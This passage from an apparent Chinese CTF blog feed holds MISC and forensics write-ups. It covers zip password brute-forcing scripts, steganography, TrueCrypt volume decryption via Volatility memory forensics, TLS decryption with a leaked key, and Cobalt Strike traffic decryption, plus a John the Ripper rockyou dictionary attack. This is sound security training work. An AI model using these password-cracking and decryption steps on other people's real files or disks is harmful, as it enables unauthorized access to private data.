class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">import base64</span><br><span class=\"line\"></span><br><span class=\"line\">import zipfile</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">zip_file_path = &#x27;your_zip_file.zip&#x27;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">values = [&#x27;71132E&#x27;, &#x27;328051N&#x27;, &#x27;248199O&#x27;, &#x27;96369v&#x27;, &#x27;216076R&#x27;,...] #替换成完整列表</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">def encode_base64_and_crack_zip(values, zip_file_path):</span><br><span class=\"line\"></span><br><span class=\"line\">    passwords = &#123;&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">    for value in values:</span><br><span class=\"line\"></span><br><span class=\"line\">        encoded_value = base64.b64encode(value.encode()).decode()</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">        try:</span><br><span class=\"line\"></span><br><span class=\"line\">            with zipfile.ZipFile(zip_file_path, &#x27;r&#x27;) as zip_file:</span><br><span class=\"line\"></span><br><span class=\"line\">                zip_file.extractall(pwd=encoded_value.encode())</span><br><span class=\"line\"></span><br><span class=\"line\">                passwords[encoded_value] = value</span><br><span class=\"line\"></span><br><span class=\"line\">                print(f&quot;Correct password found: &#123;encoded_value&#125; for value: &#123;value&#125;&quot;)</span><br><span class=\"line\"></span><br><span class=\"line\">        except Exception as e:</span><br><span class=\"line\"></span><br><span class=\"line\">            pass</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">    return passwords</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">passwords_dict = encode_base64_and_crack_zip(values, zip_file_path)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">print(&quot;\\nPasswords and corresponding base64 values:&quot;)</span><br><span class=\"line\"></span><br><span class=\"line\">for password, value in passwords_dict.items():</span><br><span class=\"line\"></span><br><span class=\"line\">    print(f&quot;Password: &#123;password&#125; -&gt; Value: &#123;value&#125;&quot;)</span><br></pre></td></tr></table></figure>\n<p>输出：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Correct password found: NDU2Nzg4UA== for value: 456788P</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">Passwords and corresponding base64 values:</span><br><span class=\"line\"></span><br><span class=\"line\">Password: NDU2Nzg4UA== -&gt; Value: 456788P</span><br></pre></td></tr></table></figure>\n<p>得到密码：NDU2Nzg4UA==</p>\n<p>解压得到 flag</p>\n<p><strong>D0g3{Th1s_REA11Y_MAX_F1A4_GGB0ND}</strong></p>\n<h2 id=\"nahida\"><a class=\"markdownIt-Anchor\" href=\"#nahida\">#</a> <strong>Nahida</strong></h2>\n<p>在 hi.txt 中没有发现什么隐写信息，查看无后缀文件</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231226140218726.png\" alt=\"\"></p>\n<p>发现是 jpg 文件的翻转文件，利用脚本逆回来</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">with open(&#x27;1.txt&#x27;,&#x27;r&#x27;) as f: #1.txt中存放原文件的16进制数据</span><br><span class=\"line\"></span><br><span class=\"line\">    x = f.read()</span><br><span class=\"line\"></span><br><span class=\"line\">    s = x[::-1]</span><br><span class=\"line\"></span><br><span class=\"line\">with open(&#x27;1.jpg&#x27;,&#x27;wb&#x27;) as f:</span><br><span class=\"line\"></span><br><span class=\"line\">    f.write(bytes.fromhex(s))</span><br></pre></td></tr></table></figure>\n<p>得到：</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231226140705500.png\" alt=\"\"></p>\n<p>重新放入 winhex 查看发现末尾多了些乱码</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231226140833855.png\" alt=\"\"></p>\n<p>重新将 16 进制提取出来进行解码</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231226140933203.png\" alt=\"\"></p>\n<p>提示早已出现在你的旅途，和神之眼，猜测是 silenteye</p>\n<p>密码为文件的名称 Nahida，decode 得到 flag</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231226141403854.png\" alt=\"\"></p>\n<p><strong>d0g3{Nahida_is_the_best_in_the_world!}</strong></p>\n<h2 id=\"dacongのsecret\"><a class=\"markdownIt-Anchor\" href=\"#dacongのsecret\">#</a> <strong>dacong の secret</strong></h2>\n<p>得到两个附件</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231226141857261.png\" alt=\"\"></p>\n<p>png FFT 得到压缩包密码：d@C0ng 1s cUt3!!!</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231226142126810.png\" alt=\"\"></p>\n<p>winhex 查看解压出来的 jpg 发现图片末尾存放着压缩包的 16 进制数据</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231226142355206.png\" alt=\"\"></p>\n<p>同样 reverse 之后写入到文件当中，根据题目描述可知，这一层的压缩包密码也在 png 当中</p>\n<p>binalk 图片时发现图片中有多余的数据块，tweak 查看下 idat 块</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231226142801972.png\" alt=\"\"></p>\n<p>发现最后的 idat 块存在异常，单独提取出来</p>\n<p>补上 dacong1hao.png 的文件头</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231226143326676.png\" alt=\"\"></p>\n<p>利用 puzzle 对该图片进行 fix，得到解压密码</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231226143557938.png\" alt=\"\"></p>\n<p>一眼 base64 隐写</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231226143911632.png\" alt=\"\"></p>\n<p>解码得到：</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231226144533891.png\" alt=\"\"></p>\n<p>pass {m1ku_1s_sha_fufu123}，依然是个 pass，jpg 的 jphide 隐写</p>\n<p>解密得到 flag</p>\n<p><strong>flag{d@C0ng_1s_r3@lIy_Re@iLY_Cute}</strong></p>\n<p>小结：这次比赛 misc 知识点难度倒是不大，但是很套，需要猜的知识点和步骤也比较多</p>\n",
            "tags": [
                "MISC"
            ]
        },
        {
            "id": "https://nnnpc.github.io/2024/04/16/TrueCrypt%E8%A7%A3%E5%AF%86/",
            "url": "https://nnnpc.github.io/2024/04/16/TrueCrypt%E8%A7%A3%E5%AF%86/",
            "title": "TrueCrypt解密",
            "date_published": "2024-04-16T05:58:19.036Z",
            "content_html": "<h1 id=\"truecrypt解密\"><a class=\"markdownIt-Anchor\" href=\"#truecrypt解密\">#</a> TrueCrypt 解密</h1>\n<p>最近做到了一道 TrueCrypt 加密镜像的题目，这里用两种方法来解密记录一下</p>\n<h2 id=\"方法一\"><a class=\"markdownIt-Anchor\" href=\"#方法一\">#</a> 方法一：</h2>\n<p>Passware 一把梭</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231128194137537.png\" alt=\"\"></p>\n<p>成功解密之后的文件会被输出到指定目录当中</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231128194328949.png\" alt=\"\"></p>\n<p>添加后缀为 img，导入 DG</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231128194446760.png\" alt=\"\"></p>\n<p>在主分区中能够找到机密文档，打开获得 flag</p>\n<h2 id=\"方法二\"><a class=\"markdownIt-Anchor\" href=\"#方法二\">#</a> 方法二：</h2>\n<p>这道题目给出的文件有 TrueCrypt 加密的 sec 文件和内存文件 sec.raw，可以先使用 vol2 对内存文件进行取证拿到密钥</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">.\\volatility_2.6_win64_standalone.exe -f sec.raw imageinfo</span><br><span class=\"line\"></span><br><span class=\"line\">.\\volatility_2.6_win64_standalone.exe -f sec.raw --profile=Win7SP1x64 truecryptmaster Recover</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231128195025089.png\" alt=\"\"></p>\n<p>这里我是直接手撕出来了，添上后缀.key</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL0FtTmU1aUEvTUtEZWNyeXB0\">https://github.com/AmNe5iA/MKDecrypt</span></p>\n<p>利用该 github 的项目能够直接实现解密并且自动挂载到 kali</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mkdir mount</span><br><span class=\"line\"></span><br><span class=\"line\">sudo python3 MKDecrypt.py -v -X -r -m mount sec 1.key</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231128195651952.png\" alt=\"\"></p>\n<p>挂载完成后，去文件夹中便能找到机密文档</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231128195822063.png\" alt=\"\"></p>\n<p>这里使用完记得按 enter 取消挂载，如果使用了错误的退出方式例如 ctrl +<br>\nc，请使用以下方法进行移除</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo umount /dev/mapper/MKDecrypt1</span><br><span class=\"line\"></span><br><span class=\"line\">sudo dmsetup remove MKDecrypt1</span><br></pre></td></tr></table></figure>\n",
            "tags": [
                "MISC"
            ]
        },
        {
            "id": "https://nnnpc.github.io/2024/04/16/TLS%E6%B5%81%E9%87%8F%E8%A7%A3%E5%AF%86/",
            "url": "https://nnnpc.github.io/2024/04/16/TLS%E6%B5%81%E9%87%8F%E8%A7%A3%E5%AF%86/",
            "title": "TLS流量解密",
            "date_published": "2024-04-16T05:58:19.035Z",
            "content_html": "<p>原题来源：BUUCTF greatescape<br>\n 本题考察的是一个数据包的 TLS 流解密，记录一下<br>\n下载附件，解压下来一个流量包，用 wireshark 进行查看</p>\n<p>查看下协议分级，能看到 TCP、TLS 协议，所以猜测是 TLS 流量解密</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/04as4ZLypn1OgVBR.png!thumbnail\" alt=\"\"></p>\n<p>如果是 TLS，那么一定会有私钥需要给出进行解密，查看下 tcp 追踪流，在流 18 的时候发现</p>\n<p>有个 ssc.key</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/IhQwxHp4ircr3Cbe.png!thumbnail\" alt=\"\"></p>\n<p>更加确定了 TLS 流解密的猜想，下一个流 19，便是我们要找的私钥文件</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/gGzRQ0Pmba3Uq39A.png!thumbnail\" alt=\"\"></p>\n<p>保存为 ssc.key，在编辑 -&gt; 首选项 -&gt;Protocols-&gt;TLS 中</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/ogGhLSU2hu0zlRng.png!thumbnail\" alt=\"\"></p>\n<p>找到 edit，导入我们的 key</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/XNHe44Hs1axllQyO.png!thumbnail\" alt=\"\"></p>\n<p>前面是路径，这里直接点击找到文件便能生成，确定之后查看能导出的 http 对象，很明显地发现能导出的对象变多了</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/v4Amvap0MoL8GIf9.png!thumbnail\" alt=\"\"></p>\n<p>试试用关键字搜索 flag</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http contains FLAG</span><br></pre></td></tr></table></figure>\n<p>找到 flag<br>\n<img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/9wlCpVN9QVFgWiOX.png!thumbnail\" alt=\"\" title=\"fig:\"></p>\n<p OkThatWasWay2Easy=\"\">FLAG: INS</p>\n<p>包上 flag 为：<strong>flag{OkThatWasWay2Easy}</strong></p>\n",
            "tags": [
                "MISC"
            ]
        },
        {
            "id": "https://nnnpc.github.io/2024/04/16/SICTF%20%E6%B5%81%E9%87%8F%E9%A2%98wp/",
            "url": "https://nnnpc.github.io/2024/04/16/SICTF%20%E6%B5%81%E9%87%8F%E9%A2%98wp/",
            "title": "SICTF 流量题wp",
            "date_published": "2024-04-16T05:58:19.029Z",
            "content_html": "<p>这次比赛出了三道流量题，一道 cs，一道冰蝎，一道二者结合的题目，第一次出这类的流量题所以很多东西没有研究的很深，出题思路可能经不起深究，欢迎各位师傅的交流与讨论</p>\n<p>接下来看看题目</p>\n<h1 id=\"一起上号不\"><a class=\"markdownIt-Anchor\" href=\"#一起上号不\">#</a> 一起上号不</h1>\n<p>这题也是因为该流量所使用的工具命名的，cobalt<br>\nstrike 是一个可多人协作的渗透工具</p>\n<p>这个工具的流量特征其实挺明显的</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/75KfXS2Ztg0dceCW.png!thumbnail\" alt=\"\"></p>\n<p>过滤一下 http 流可以发现是 131 和 144 两台机子之间的通信</p>\n<p>在本题中，可以看到流量包尾有一个 key.zip，导出 http 对象之后使用脚本提取出 private<br>\nkey</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL1NsemR1ZGUvY3Mtc2NyaXB0cw==\">https://github.com/Slzdude/cs-scripts</span></p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/TZYi4LLl4NOyrnyh.png!thumbnail\" alt=\"\"></p>\n<p>根据 cs 的工作流程可知，如果需要解密出通信的流量，得先知道协商密钥，而协商密钥和主机信息被使用 rsa 公钥加密之后放在了心跳包的 cookie 中</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/UvzyhPD4ruTKps7E.png!thumbnail\" alt=\"\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">U8jm3+oqzYLuUiRd9F3s7xVz7fGnHQYIKF9ch6GRseWfcBSSk+aGhWP3ZUyHIkwRo1/oDCcKV7LYAp022rCm9bC7niOgMlsvgLRolMKIz+Eq5hCyQ0QVScH8jDYsJsCyVw1iaTf5a7gHixIDrSbTp/GiPQIwcTNZBXIJrll540s=</span><br></pre></td></tr></table></figure>\n<p>利用私钥解密该 cookie<br>\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL1dCR2xJbC9DU19EZWNyeXB0\">https://github.com/WBGlIl/CS_Decrypt</span></p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/52cKG63Uys3inOuh.png!thumbnail\" alt=\"\"></p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/2G1zSIgrSoX6i3cf.png!thumbnail\" alt=\"\"></p>\n<p>得到：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">AES key:ef08974c0b06bd5127e04ceffe12597b</span><br><span class=\"line\">HMAC key:bd87fa356596a38ac3e3bb0b6c3496e9</span><br></pre></td></tr></table></figure>\n<p>拿着 key 就可以去解密通信流量了<br>\n这里过滤 http 可以清楚的看到</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/bECvOauc7bVO3lHC.png!thumbnail\" alt=\"\"></p>\n<p>第一个框心跳包的发送，发现有命令需要执行之后，teamserver 加密了数据包，并且作为返回包返回，body 部分包含命令，经过被控端的解码执行操作后，通过 POST 请求将加密的数据包发送回 teamserver，body 部分包含了命令执行的结果</p>\n<p>因此，我们去拿 data 数据进行解密分析，根据脚本的要求，将 data 块进行编码操作之后放入脚本中</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/9xKvvG5BmCDga5d8.png!thumbnail\" alt=\"\"></p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/ssDN9pRf019VyeRe.png!thumbnail\" alt=\"\"></p>\n<p>修改对应的值之后成功看到命令执行的回显内容，项目中还有一个脚本 CS_Task_AES_Decrypt.py 是解密执行的命令的，也就是心跳包的返回包，可以去尝试一下，但是本题用不到，最后能在第三个命令执行结果的请求包中解密获得 flag</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/Oi2FJNjWsCJFkQkD.png!thumbnail\" alt=\"\"></p>\n<p><strong>SICTF{88a39373-e204-43b6-b321-33ac8972fde9}</strong></p>\n<h1 id=\"easy_shark\"><a class=\"markdownIt-Anchor\" href=\"#easy_shark\">#</a> <strong>Easy_Shark</strong></h1>\n",
            "tags": [
                "MISC"
            ]
        },
        {
            "id": "https://nnnpc.github.io/2024/04/16/SHCTF%20MISC/",
            "url": "https://nnnpc.github.io/2024/04/16/SHCTF%20MISC/",
            "title": "SHCTF MISC",
            "date_published": "2024-04-16T05:58:19.027Z",
            "content_html": "<h1 id=\"week1\"><a class=\"markdownIt-Anchor\" href=\"#week1\">#</a> WEEK1</h1>\n<h2 id=\"真的签到\"><a class=\"markdownIt-Anchor\" href=\"#真的签到\">#</a> 真的签到</h2>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/Je4ROtP2TxbJEXRk.png!thumbnail\" alt=\"\"></p>\n<p><strong>flag{Welc0me_tO_SHCTF2023}</strong></p>\n<h2 id=\"请对我使用社工吧\"><a class=\"markdownIt-Anchor\" href=\"#请对我使用社工吧\">#</a> 请对我使用社工吧</h2>\n<p>社工题，根据图片去寻找</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/NdRA2pAZJcnLNnqp.png!thumbnail\" alt=\"\"></p>\n<p>根据万达体彩店这个信息，找对面有大学的，最终找到山东东营西城万达广场，对面就是中国石油大学</p>\n<p><strong>flag {山东省<em>东营市</em>东营区_中国石油大学}</strong></p>\n<h2 id=\"也许需要一些py\"><a class=\"markdownIt-Anchor\" href=\"#也许需要一些py\">#</a> 也许需要一些 py</h2>\n<p>将未加密的 flag 文件解压出来放入 winhex</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/WBluAVM4HPkFw0Y9.png!thumbnail\" alt=\"\"></p>\n<p>补上缺少的 PNG 头，并且加上 png 后缀</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/YVnu7n95ROxrmrs1.png!thumbnail\" alt=\"\"></p>\n<p>得到图片，发现是一串 md5，解码一下注释</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/vs3CPyNSUgihSQAZ.png!thumbnail\" alt=\"\"></p>\n<p>发现是一个 key，将大写转为小写，解压出加密文件</p>\n<p>得到</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/AHesG8y4wmcM1T7S.png!thumbnail\" alt=\"\"></p>\n<p>根据题目提示：flag 怎么没大没小的可以知道这并不是最终的 flag，并且大小写有问题，根据前面得到的 md5 可以猜测是正确 flag 的 md5 值用来校验，利用脚本来组合字符串校验 md5</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">import hashlib</span><br><span class=\"line\">import itertools</span><br><span class=\"line\"></span><br><span class=\"line\">target_md5 = &quot;63e62fbce22f2757f99eb7da179551d2&quot;</span><br><span class=\"line\">input_string = &quot;pNg_and_Md5_SO_GreaT&quot;</span><br><span class=\"line\"></span><br><span class=\"line\">def generate_case_combinations(input_string):</span><br><span class=\"line\">    combinations = []</span><br><span class=\"line\">    for case_combination in itertools.product(*zip(input_string.lower(), input_string.upper())):</span><br><span class=\"line\">        combinations.append(&#x27;&#x27;.join(case_combination))</span><br><span class=\"line\">    return combinations</span><br><span class=\"line\"></span><br><span class=\"line\">def find_matching_string(target_md5, input_string):</span><br><span class=\"line\">    for combination in generate_case_combinations(input_string):</span><br><span class=\"line\">        md5_hash = hashlib.md5(combination.encode()).hexdigest()</span><br><span class=\"line\">        if md5_hash == target_md5:</span><br><span class=\"line\">            return combination</span><br><span class=\"line\">    return None</span><br><span class=\"line\"></span><br><span class=\"line\">result = find_matching_string(target_md5, input_string)</span><br><span class=\"line\">if result:</span><br><span class=\"line\">    print(&quot;找到匹配的字符串:&quot;, result)</span><br><span class=\"line\">else:</span><br><span class=\"line\">    print(&quot;未找到匹配的字符串&quot;)</span><br></pre></td></tr></table></figure>\n<p>得到</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/Ow1KcmQEb2rYDTWi.png!thumbnail\" alt=\"\"></p>\n<p><strong>flag{Png_AnD_md5_so_GReAt}</strong></p>\n<h2 id=\"ez-misc\"><a class=\"markdownIt-Anchor\" href=\"#ez-misc\">#</a> ez-misc</h2>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/G7SJFsUbWPEWUZdw.png!thumbnail\" alt=\"\"></p>\n<p>得到附件是一串 01 字符串，利用脚本转换为二维码</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">from PIL import Image</span><br><span class=\"line\">from zlib import *</span><br><span class=\"line\"></span><br><span class=\"line\">MAX = 29</span><br><span class=\"line\">pic = Image.new(&quot;RGB&quot;,(MAX,MAX))</span><br><span class=\"line\">str =&quotquot;</span><br><span class=\"line\">i=0</span><br><span class=\"line\">for y in range(0,MAX):</span><br><span class=\"line\">    for x in range(0,MAX):</span><br><span class=\"line\">        if(str[i] == &#x27;1&#x27;):</span><br><span class=\"line\">            pic.putpixel([x,y],(0,0,0))</span><br><span class=\"line\">        else:pic.putpixel([x,y],(255,255,255))</span><br><span class=\"line\">        i = i+1</span><br><span class=\"line\">pic.show()</span><br><span class=\"line\">pic.save(&quot;flag.png&quot;)</span><br></pre></td></tr></table></figure>\n<p>得到：</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/V6wvSI1oeWGz3s1T.png!thumbnail\" alt=\"\"></p>\n<p>扫描得到：hit_k1sme4_4_fun</p>\n<p>解压加密附件</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/SNGDjvpd3ckfxv5B.png!thumbnail\" alt=\"\"></p>\n<p>根据 PK 头添上后缀.zip</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/YurSfv6DBt1rvoJ9.png!thumbnail\" alt=\"\"></p>\n<p>解密注释提示 rockyou 字典，证明需要用到字典爆破</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">zip2john flag.zip &gt; hash</span><br><span class=\"line\">john --wordlist=rockyou.txt hash</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/c4NDqHZdZFmTmXfQ.png!thumbnail\" alt=\"\"></p>\n<p>得到密码 palomino，解压得到</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/e5IvjzrYaQGXn2fK.png!thumbnail\" alt=\"\"></p>\n<p>猜测为字频统计，使用脚本排列</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># -*- coding:utf-8 -*-</span><br><span class=\"line\">#Author: mochu7</span><br><span class=\"line\">alphabet = &quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890!@#$%^&amp;*()_+- =\\\\&#123;\\\\&#125;[]&quot;</span><br><span class=\"line\">strings = open(&#x27;flag.txt&#x27;).read()</span><br><span class=\"line\"></span><br><span class=\"line\">result = &#123;&#125;</span><br><span class=\"line\">for i in alphabet:</span><br><span class=\"line\">   counts = strings.count(i)</span><br><span class=\"line\">   i = &#x27;&#123;0&#125;&#x27;.format(i)</span><br><span class=\"line\">   result[i] = counts</span><br><span class=\"line\"></span><br><span class=\"line\">res = sorted(result.items(),key=lambda item:item[1],reverse=True)</span><br><span class=\"line\">for data in res:</span><br><span class=\"line\">   print(data)</span><br><span class=\"line\"></span><br><span class=\"line\">for i in res:</span><br><span class=\"line\">   flag = str(i[0])</span><br><span class=\"line\">   print(flag[0],end=&quot;&quot;)</span><br></pre></td></tr></table></figure>\n<p>得到 flag</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/m7O5XTnMa7pAJ8Rh.png!thumbnail\" alt=\"\"></p>\n<p><strong>flag{SHyk1sme4}</strong></p>\n<h2 id=\"jaeger-lover\"><a class=\"markdownIt-Anchor\" href=\"#jaeger-lover\">#</a> Jaeger lover</h2>\n<p>得到图片和加密压缩包</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/Bokgo2Bhq0ZF3Uiq.png!thumbnail\" alt=\"\"></p>\n<p>图片尾的 base 解码得到</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/XdlCAm3wg2CD1w41.png!thumbnail\" alt=\"\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">you know the Windows is a system for PC,but do you know the what is thr Op. System for this Jaeger？</span><br></pre></td></tr></table></figure>\n<p>让我们去找暴风赤红的操作系统</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/DcuefirFrdTmu4sy.png!thumbnail\" alt=\"\"></p>\n<p>能在百度百科中找到 Tri-Sun 